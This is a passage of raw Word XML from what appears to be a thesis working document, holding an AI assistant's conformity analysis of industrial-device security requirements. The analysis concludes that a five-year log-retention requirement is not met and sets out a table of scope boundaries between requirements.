          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-003/008/009</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; RQ-012 notes it as bearing on </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>what there is to retain</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, not as a retention mechanism.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25A54524" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Enforced boundaries with RQ-013/RQ-014</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — RQ-012 tests only the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>general-log retention duration/capacity</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>version-history retention → RQ-013</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>access restriction → RQ-014</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (the audit paradox is framed there).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="505A3A69" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Retained the correct core</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — CR mapping completion (CR 2.10/3.9/6.1), the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>precision correction</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> on warm-reset survival (hypothesis, verified in TS-2), and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>compound time-attribution</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> point (undatable fragment). The verdict remains the set's </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cleanest, structural non-conformity</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId320" w:history="1">
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="307FC129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Corrected verdict, tightly bounded: </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-012 = retain the tracing log for 5 years — definitively NOT met</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, because the log is a </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>non-safety, undatable, capacity-bounded circular buffer cleared on cold start, and the device's own mandatory annual reboot guarantees that clearing</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. Uniquely, this cannot be rescued by the environmental assumption — with </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>version-history retention</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-013</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>access restriction</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-014</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>install-reboot self-erasing</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-008</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>collection completeness</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-003/008/009</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302214C4" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:pict w14:anchorId="409848C9">
          <v:rect id="_x0000_i1822" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="268378FF" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Scope-boundary recheck — status (13 of 14 rechecked)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318"/>
        <w:gridCol w:w="5296"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="41EF63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C5A7A7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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs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BD836A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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282"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6759DE" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Corrected</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>boundary</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="42783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2AF3E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Identify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9A5FC" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t>RQ-004, RQ-006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15A77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 xml:space="preserve">Completeness + confidentiality; </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>integrity</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> → RQ-005; </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>change-count</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> → RQ-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="3C545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CC961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Protect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63F04" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t>RQ-002, RQ-005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C5FCF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i/>
                <w:iCs/>
              </w:rPr>
              <w:t>Evidence</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> → RQ-003; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:i/>
                <w:iCs/>
              </w:rPr>
              <w:t>authorization</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> → RQ-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="206C1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D34E1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Authorize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24CD0" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t>RQ-011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9C6CA" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Update-gate/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>EoP</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> + unauthenticated-DCP; learning-phase = N/A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="5FB8F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BC78ED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Collect</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282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80393" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t>RQ-003, RQ-008, RQ-009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DF266" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t>REVISION_COUNTER/I&amp;M4 in RQ-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="3533E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FF815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Retain</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>restrict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D14FF" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>RQ-012</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:t>, RQ-013, RQ-014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B4C89" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve">RQ-012 = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>general</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>retention</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve">; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>version</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> → RQ-013; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>access</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> → RQ-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="6C270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61A41" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Withstand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9FC7D" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t>RQ-001, RQ-010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82F30" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t>Flood/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>DoS</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>fuzz</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> in RQ-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="314BD7CA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lastRenderedPageBreak/>
        <w:t xml:space="preserve">Only </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-013</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-014</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> remain to be rechecked for the same boundary hygiene (RQ-013 = version-history retention; RQ-014 = access restriction / the audit paradox).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45A227A4" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Would you like me to**(a)** recheck </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-013</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> next,</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(b)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> recheck </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-014</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, or**(c)** proceed to </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>compile the fully corrected RQ-001 → RQ-014 set into the consolidated thesis appendix</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> once those two are done?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1751998D" w14:textId="77777777" w:rsidR="00483B71" w:rsidRDefault="00483B71" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30E6FE94" w14:textId="77777777" w:rsidR="00483B71" w:rsidRDefault="00483B71" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="120C47BD" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4813B90C" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48FC9222" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D110752" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AEE3492" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="534D595A" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49812EED" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13DC2E5E" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="668323AC" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22FEB6A1" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="424A5F5B" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3708D460" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64002E51" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23374DD5" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07BC76FE" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="457AD63B" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14830184" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
